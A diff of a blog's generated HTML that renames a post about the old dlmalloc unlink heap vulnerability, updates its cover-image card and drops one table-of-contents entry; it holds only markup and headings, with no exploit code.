+                <img src="/p/dlmalloc_unlink_vuln/cover.033517a0a0b7d067ca7d7492d6d45d85_hubf4d37b5b49b46cd1ccc2d3735557c81_257141_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Old Dlmalloc Unlink Vulnerability"
+                        data-key="dlmalloc_unlink_vuln" 
+                        data-hash="md5-AzUXoKC30GfKfXSS1tRdhQ==">
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">[draft] Dlmalloc 2001 Unlink Vulnerability</h2>
+            <h2 class="article-title">Old Dlmalloc Unlink Vulnerability</h2>
         </div>
     </a>
 </article>
@@ -1185,7 +979,6 @@ ret
             <nav id="TableOfContents">
   <ol>
     <li><a href="#references">References</a></li>
-    <li><a href="#dlmalloc-basics-32-bit-x86-architecture">Dlmalloc Basics (32-bit x86 architecture)</a></li>
     <li><a href="#heap-three">Heap Three</a></li>
     <li><a href="#before-unlink">Before <code>unlink()</code></a></li>
     <li><a href="#create-a-fake-chunk">Create a fake chunk</a></li>
